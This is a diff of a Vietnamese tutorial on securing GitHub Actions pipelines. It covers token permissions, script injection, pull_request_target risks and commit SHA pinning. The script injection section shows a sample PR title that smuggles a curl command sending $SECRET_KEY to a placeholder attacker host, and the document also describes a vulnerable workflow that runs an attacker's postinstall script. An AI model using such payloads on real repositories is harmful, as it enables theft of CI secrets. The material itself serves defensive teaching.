@@ -1,13 +1,13 @@
-# Gia cố Bảo mật Pipeline: GITHUB_TOKEN Tối thiểu, Chống Script Injection, Bẫy Pwn Request & Ghim SHA 40 Ký tự
+# Bảo mật GitHub Actions: Quyền GITHUB_TOKEN, Chống Script Injection, Pwn Request và Ghim Commit SHA
 
-Nhiều lập trình viên dồn 100% tâm trí bảo mật vào mã nguồn Express/Fastify trên Production, nhưng lại quên mất một sự thật lạnh gáy: **máy chủ CI/CD Runner chính là "Kho Báu Tối Thượng" mà mọi nhóm tin tặc săn lùng!**
+Nhiều lập trình viên tập trung bảo mật mã nguồn ứng dụng trên Production nhưng lại bỏ qua một thực tế quan trọng: **máy chủ CI/CD Runner là mục tiêu tấn công có giá trị rất cao** do tập trung nhiều quyền truy cập nhạy cảm.
 
-- [!] **Quyền lực tối cao hội tụ tại một điểm:** Runner nắm trong tay quyền ghi ngược mã độc vào kho Git (`GITHUB_TOKEN`), chìa khoá đẩy Container Image lên Registry và quyền triển khai thẳng lên đám mây AWS/Kubernetes!
-- [!] **Bề mặt tấn công mở ra Internet:** Chỉ cần một dòng cấu hình ngây thơ trong `.github/workflows/`, một người lạ trên mạng mở một Pull Request bình thường cũng có thể chiếm quyền chạy lệnh trái phép từ xa (**RCE — Remote Code Execution**) ngay bên trong Runner của công ty bạn!
+- [!] **Quyền truy cập tập trung:** Runner nắm giữ quyền ghi vào kho Git (`GITHUB_TOKEN`), thông tin xác thực để đẩy Container Image lên Registry và quyền triển khai lên hạ tầng AWS/Kubernetes.
+- [!] **Bề mặt tấn công từ Internet:** Chỉ một cấu hình thiếu kiểm soát trong `.github/workflows/` có thể cho phép người ngoài mở một Pull Request và thực thi mã từ xa (**RCE — Remote Code Execution**) ngay bên trong Runner của tổ chức.
 
 ```visual
 kind: groups
-title: "4 Lá Chắn Sống Còn Gia Cố Bảo Mật Pipeline [!badge:emerald:Zero-Trust CI]"
+title: "4 Nguyên tắc gia cố bảo mật Pipeline [!badge:emerald:Zero-Trust CI]"
 subtitle: Khóa chặt toàn bộ bề mặt tấn công cấp độ Workflow từ quyền hạn Token, đầu vào PR, ngữ cảnh Fork đến chuỗi cung ứng Action
 columns: 2
 items:
@@ -22,7 +22,7 @@ items:
       - "Chỉ mở quyền ghi cục bộ (như `packages: write`) ở đúng Job đóng gói"
   - num: 2
     icon: terminal
-    title: "Triệt Tiêu Script Injection"
+    title: "Phòng chống Script Injection"
     badge: Anti-RCE
     tone: amber
     desc: "Tuyệt đối không nối trực tiếp dữ liệu người dùng `${{ github.event... }}` vào câu lệnh `run:`."
@@ -34,10 +34,10 @@ items:
     title: "Chặn lỗ hổng nghiêm trọng Pwn Request"
     badge: Fork Isolation
     tone: rose
-    desc: "Phân biệt sống còn giữa `on: pull_request` và `on: pull_request_target` khi nhận PR từ kho Fork."
+    desc: "Phân biệt rạch ròi giữa `on: pull_request` và `on: pull_request_target` khi nhận PR từ kho Fork."
     bullets:
       - "Mọi bước chạy `npm ci`, `lint`, `test` bắt buộc dùng `on: pull_request`"
-      - "Cấm checkout và thực thi code PR bên trong `pull_request_target`!"
+      - "Cấm checkout và thực thi code PR bên trong `pull_request_target`"
   - num: 4
     icon: git-commit
     title: "Ghim Cứng Commit SHA 40 Ký Tự"
@@ -45,39 +45,39 @@ items:
     tone: emerald
     desc: Miễn nhiễm trước tấn công trỏ lại thẻ Git khả biến (`@v4`, `@main`) của Action bên thứ ba.
     bullets:
-      - "Mã băm Git SHA-1 đầy đủ **40 ký tự hex** là bất biến toán học tuyệt đối"
+      - "Mã băm Git SHA-1 đầy đủ **40 ký tự hex** là bất biến"
       - "Ghi kèm chú thích `# v0.28.0` bên cạnh để dễ bảo trì"
 ```
 
 ---
 
-## 1. Lá chắn #1 — Khoá chặt `GITHUB_TOKEN` theo Nguyên lý Đặc quyền tối thiểu (`permissions:`)
+## 1. Giới hạn quyền của `GITHUB_TOKEN` theo nguyên tắc đặc quyền tối thiểu (`permissions:`)
 
 ```visual
 kind: illustration
 diagram: "cicd:c10"
 alt: "Ba trụ cột gia cố bảo mật GitHub Actions gồm hạ quyền GITHUB_TOKEN và cô lập Fork, chống tiêm lệnh Script Injection qua biến env và ghim cứng SHA 40 ký tự"
-title: "Giải Phẫu Gia Cố Chuỗi Cung Ứng Workflow: Least-Privilege, Chống RCE & Ghim SHA-40"
-subtitle: "Đóng chặt ba lỗ hổng tấn công nguy hiểm nhất nhắm thẳng vào máy chủ CI/CD Runner từ các Pull Request bên ngoài"
+title: "Gia cố bảo mật Workflow: Least-Privilege, Chống RCE và Ghim SHA-40"
+subtitle: "Khắc phục ba lỗ hổng tấn công phổ biến nhắm thẳng vào máy chủ CI/CD Runner từ các Pull Request bên ngoài"
 caption: "Mô hình phòng thủ Zero-Trust cấp Workflow: khoá permissions: contents: read, cô lập dữ liệu người dùng qua biến môi trường env: và ghim mã băm Git 40 ký tự"
 callouts:
   - num: 1
-    label: "Thu hồi quyền mặc định & Chặn bẫy Pwn Request"
+    label: "Thu hồi quyền mặc định & Phòng tránh Pwn Request"
     desc: "Ép permissions: contents: read ở đầu tệp và tuyệt đối không checkout thực thi code từ nhánh Fork bên trong sự kiện pull_request_target."
     tone: sky
   - num: 2
-    label: "Triệt tiêu Script Injection bằng biến trung gian env:"
+    label: "Phòng chống Script Injection bằng biến trung gian env:"
     desc: "Không bao giờ nối thẳng biểu thức ${{ github.event... }} vào chuỗi lệnh bash; đưa qua khối env: để Shell đọc dưới dạng chuỗi thuần an toàn."
     tone: amber
   - num: 3
     label: "Ghim cứng mã băm Commit SHA đầy đủ 40 ký tự"
-    desc: "Thay thế thẻ khả biến @v4 bằng mã băm SHA-1 40 ký tự bất biến toán học (kèm Dependabot cập nhật định kỳ) để miễn nhiễm tấn công chiếm thẻ."
+    desc: "Thay thế thẻ khả biến @v4 bằng mã băm SHA-1 40 ký tự bất biến (kèm Dependabot cập nhật định kỳ) để phòng tránh tấn công chiếm thẻ."
     tone: emerald
 ```
 
-Mỗi khi một Workflow khởi chạy, GitHub tự động cấp một thẻ xác thực tạm thời gọi là **`GITHUB_TOKEN`**. Trên các kho lưu trữ hoặc tổ chức chưa siết cấu hình mặc định, chiếc thẻ này mang quyền **`write-all`** — cho phép bất kỳ bước kiểm thử nào bị xâm nhập cũng tự ý đẩy commit thẳng vào nhánh, sửa bản phát hành Release hoặc xoá gói!
+Mỗi khi một Workflow khởi chạy, GitHub tự động cấp một token xác thực tạm thời gọi là **`GITHUB_TOKEN`**. Trên các kho lưu trữ hoặc tổ chức chưa siết cấu hình mặc định, token này mang quyền **`write-all`** — cho phép bất kỳ bước kiểm thử nào bị xâm nhập cũng có thể đẩy commit vào nhánh, sửa bản phát hành Release hoặc xóa gói.
 
-Quy chuẩn bảo mật bắt buộc năm 2026 là **nguyên lý Đặc quyền tối thiểu (Least Privilege)** — giống như cấp **thẻ từ khách sạn chỉ mở đúng cửa phòng 302** thay vì trao chùm chìa khoá vạn năng của quản lý toà nhà: **Khoá chỉ đọc (==`contents: read`==) ở cấp gốc đầu tệp Workflow, và chỉ mở quyền ghi cục bộ (`packages: write`) cho riêng Job thực sự cần**:
+Quy chuẩn bảo mật bắt buộc là **nguyên tắc Đặc quyền tối thiểu (Least Privilege)**: **khóa ở mức chỉ đọc (==`contents: read`==) ở cấp gốc đầu tệp Workflow, và chỉ mở quyền ghi cục bộ (`packages: write`) cho riêng Job thực sự cần**. *(Cơ chế này tương tự việc cấp thẻ từ chỉ mở đúng một phòng cần thiết thay vì dùng chìa khóa tổng cho toàn bộ tòa nhà).*
 
 ```yaml
 name: Hardened CI
@@ -110,12 +110,11 @@ jobs:
 
 ---
 
-## 2. Lá chắn #2 — Triệt tiêu lỗ hổng Thực thi Mã từ xa **Script Injection**
+## 2. Phòng chống lỗ hổng Script Injection khi xử lý dữ liệu đầu vào
 
-> [!ANALOGY] Giống hệt lỗi SQL Injection trong Node.js!
-> Nối thẳng `${{ github.event.pull_request.title }}` vào khối `run:` nguy hiểm y hệt như cộng chuỗi `"SELECT * FROM users WHERE name = '" + req.body.name + "'"`! Vì bộ tiền xử lý của GitHub Actions **thay thế văn bản `${{ ... }}` TRƯỚC KHI trao kịch bản cho trình thông dịch `bash`**, kẻ tấn công chỉ cần đặt tiêu đề PR chứa `"; curl ... #` là thoát ra thành câu lệnh shell mới!
+Lỗ hổng **Script Injection** xảy ra khi bạn nhúng trực tiếp biểu thức ngữ cảnh (như `${{ github.event.pull_request.title }}`) vào khối lệnh `run:`. Vì bộ tiền xử lý của GitHub Actions **thay thế văn bản `${{ ... }}` trước khi chuyển kịch bản cho trình thông dịch `bash`**, kẻ tấn công có thể chèn ký tự kết thúc lệnh như `"; curl ... #` để thực thi mã shell tùy ý. *(Cơ chế này tương tự lỗ hổng SQL Injection trong lập trình backend khi cộng chuỗi trực tiếp dữ liệu người dùng vào câu truy vấn).*
 
-Giả sử tin tặc mở PR mang tiêu đề:
+Giả sử người mở PR đặt tiêu đề:
 `feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #`
 
 Câu lệnh thực sự chạy trên máy chủ Runner sau bước nội suy văn bản sẽ biến thành:
@@ -126,14 +125,14 @@ echo "Đang kiểm tra PR: feat: fix typo"; curl -s https://evil.example.invalid
 
 ```visual
 kind: compare
-title: "Giải Phẫu Lỗ Hổng Script Injection & Cách Khắc Phục Chuẩn Bằng Khối env:"
-subtitle: "Mọi dữ liệu do người mở PR kiểm soát (title, body, comment, commit message, và cả tên nhánh head.ref!) đều là đầu vào không tin cậy"
+title: "Cơ chế gây lỗ hổng Script Injection và cách khắc phục qua biến môi trường env:"
+subtitle: "Mọi dữ liệu do người mở PR kiểm soát (title, body, comment, commit message, và tên nhánh head.ref) đều là đầu vào không tin cậy"
 left:
   badge: "LỖ HỔNG RCE · Nối thẳng vào run:"
   title: "GitHub nội suy văn bản trước khi Bash chạy"
   tone: rose
   code: |
-    # NGUY HIỂM CHẾT NGƯỜI: Nội suy trực tiếp vào shell!
+    # LỖ HỔNG BẢO MẬT: Nội suy trực tiếp vào shell!
     - name: Kiểm tra tiêu đề & nhánh PR
       run: |
         echo "PR: ${{ github.event.pull_request.title }}"
@@ -165,18 +164,18 @@ right:
 
 ## 3. Phòng chống lỗ hổng Pwn Request: Phân biệt `pull_request` vs `pull_request_target`
 
-Tại sao GitHub lại sinh ra hai sự kiện có cái tên dễ gây nhầm lẫn chết người đến vậy?
+Tại sao GitHub lại cung cấp hai sự kiện dễ gây nhầm lẫn nghiêm trọng như vậy?
 
 ```visual
 kind: compare
-title: "Sự Khác Biệt Sống Còn Đối Với PR Từ Kho Fork: pull_request vs pull_request_target"
-subtitle: "Sai một hậu tố _target là trao toàn bộ kho Secrets Production cho người lạ trên Internet!"
+title: "Phân biệt pull_request và pull_request_target với PR từ kho Fork"
+subtitle: "Dùng sai hậu tố _target có thể làm lộ toàn bộ Secrets Production cho người lạ từ bên ngoài"
 left:
   badge: "LỖ HỔNG NGHIÊM TRỌNG · Pwn Request"
   title: "on: pull_request_target + Checkout code của PR"
   tone: rose
   code: |
-    # THẢM HOẠ BẢO MẬT: Chạy trong ngữ cảnh nhánh main!
+    # RỦI RO BẢO MẬT CAO: Chạy trong ngữ cảnh nhánh main!
     on: pull_request_target
     jobs:
       build:
@@ -188,14 +187,14 @@ left:
           - run: npm ci && npm test   # Chạy postinstall của kẻ tấn công!
   lang: yaml
   bullets:
-    - "Chạy tệp YAML trên nhánh gốc `main` với **ĐẦY ĐỦ quyền ghi `GITHUB_TOKEN` và ĐỌC ĐƯỢC TOÀN BỘ `secrets` của dự án**"
-    - "Khi checkout `pull_request.head.sha` từ kho Fork về chạy `npm ci` / `npm test`, kẻ tấn công chỉ cần gài lệnh vào `\"postinstall\"` trong `package.json` là hút sạch toàn bộ Secrets!"
+    - "Chạy tệp YAML trên nhánh gốc `main` với **đầy đủ quyền ghi `GITHUB_TOKEN` và đọc được toàn bộ `secrets` của dự án**"
+    - "Khi checkout `pull_request.head.sha` từ kho Fork về chạy `npm ci` / `npm test`, kẻ tấn công chỉ cần gài lệnh vào `\"postinstall\"` trong `package.json` là có thể trích xuất toàn bộ Secrets."
 right:
   badge: "AN TOÀN MẶC ĐỊNH · Cô lập hộp cát"
   title: "on: pull_request cho mọi bước Build / Lint / Test"
   tone: emerald
   code: |
-    # QUY TẮC SẮT ĐÁ CHO CI KIỂM THỬ PR:
+    # CẤU HÌNH CHUẨN CHO CI KIỂM THỬ PR:
     on: pull_request
     permissions:
       contents: read
@@ -207,13 +206,13 @@ right:
           - run: npm ci && npm test
   lang: yaml
   bullets:
-    - "Đối với mọi PR mở từ kho Fork bên ngoài, GitHub **tự động tước sạch quyền ghi (`read-only`) và ẩn hoàn toàn kho `secrets`**"
-    - "An toàn tuyệt đối để biên dịch mã nguồn mới, chạy `eslint`, `vitest` mà không sợ rò rỉ tài nguyên nội bộ"
+    - "Đối với mọi PR mở từ kho Fork bên ngoài, GitHub **tự động giới hạn quyền (`read-only`) và ẩn hoàn toàn kho `secrets`**"
+    - "An toàn để biên dịch mã nguồn mới, chạy `eslint`, `vitest` mà không lo rò rỉ tài nguyên nội bộ"
 ```
 
 ---
 
-## 4. Lá chắn #4 — Chống Tấn công Chuỗi cung ứng bằng **Ghim cứng SHA 40 Ký tự**
+## 4. Bảo mật chuỗi cung ứng bằng cách ghim mã băm commit SHA 40 ký tự
 
 Vào tháng 3/2025, sự cố chấn động ngành phần mềm với Action phổ biến `tj-actions/changed-files` đã gióng hồi chuông cảnh tỉnh toàn cầu: tin tặc chiếm quyền truy cập kho Action bên thứ ba rồi **trỏ lại toàn bộ các thẻ phiên bản `@v4`, `@v45` sang một commit độc hại chuyên quét bộ nhớ RAM của Runner để đánh cắp Secret**!
 
